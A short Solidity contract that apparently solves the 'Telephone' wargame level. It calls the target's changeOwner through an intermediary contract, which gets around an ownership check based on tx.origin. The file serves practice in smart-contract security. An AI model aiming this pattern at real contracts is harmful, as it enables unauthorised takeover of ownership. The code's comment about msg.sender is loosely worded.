// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '@openzeppelin/contracts/utils/math/SafeMath.sol';
import 'interfaces/Itelephone.sol';

contract Attack_Telephone {

  Itelephone itelephone;
  address public owner;

  constructor(address _addr) {
    itelephone = Itelephone(_addr);
  }

  function change() public {
    // msg.sender is the smart contract address
    itelephone.changeOwner(msg.sender);
  }

}
